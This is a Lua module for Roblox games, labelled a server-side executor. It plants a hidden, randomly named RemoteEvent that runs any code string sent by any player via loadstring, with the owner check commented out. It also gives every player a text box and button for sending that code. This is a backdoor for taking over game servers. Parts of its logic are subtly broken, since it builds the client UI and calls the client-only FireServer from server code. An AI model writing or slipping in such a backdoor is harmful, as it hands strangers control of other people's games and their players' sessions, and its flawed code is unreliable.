-- [[ SPUNCHBUB-STYLE SS EXECUTOR MODULE ]]
return function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local JointsService = game:GetService("JointsService")

    -- 1. Setup the RemoteEvent (Hidden)
    local RemoteName = "Spunchbub_" .. HttpService:GenerateGUID(false):sub(1,5)
    local remote = Instance.new("RemoteEvent")
    remote.Name = RemoteName
    remote.Parent = JointsService

    -- 2. The Server-Side Execution Logic
    remote.OnServerEvent:Connect(function(player, code)
        -- Security Check: Only allow yourself (or whitelisted IDs)
        -- if player.UserId ~= 12345678 then return end 

        local success, result = pcall(function()
            local func = loadstring(code)
            if func then func() end
        end)
        
        if not success then
            print("SS Error from " .. player.Name .. ": " .. tostring(result))
        end
    end)

    -- 3. The UI Injector (Runs on the Client)
    local function injectUI(player)
        local sg = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
        sg.Name = "SpunchbubUI"
        sg.ResetOnSpawn = false

        local frame = Instance.new("Frame", sg)
        frame.Size = UDim2.new(0, 300, 0, 200)
        frame.Position = UDim2.new(0.5, -150, 0.5, -100)
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)

        local box = Instance.new("TextBox", frame)
        box.Size = UDim2.new(1, -20, 0, 140)
        box.Position = UDim2.new(0, 10, 0, 10)
        box.Text = "-- Server Code Here"
        box.ClearTextOnFocus = false
        box.MultiLine = true
        box.TextXAlignment = Enum.TextXAlignment.Left
        box.TextYAlignment = Enum.TextYAlignment.Top

        local btn = Instance.new("TextButton", frame)
        btn.Size = UDim2.new(1, -20, 0, 30)
        btn.Position = UDim2.new(0, 10, 1, -40)
        btn.Text = "EXECUTE SERVER-SIDE"
        btn.BackgroundColor3 = Color3.fromRGB(70, 0, 150)
        btn.TextColor3 = Color3.new(1, 1, 1)

        btn.MouseButton1Click:Connect(function()
            remote:FireServer(box.Text)
        end)
    end

    -- Inject for all current and future players
    for _, p in pairs(Players:GetPlayers()) do injectUI(p) end
    Players.PlayerAdded:Connect(injectUI)

    print("Spunchbub SS Module Loaded. Remote: " .. RemoteName)
end
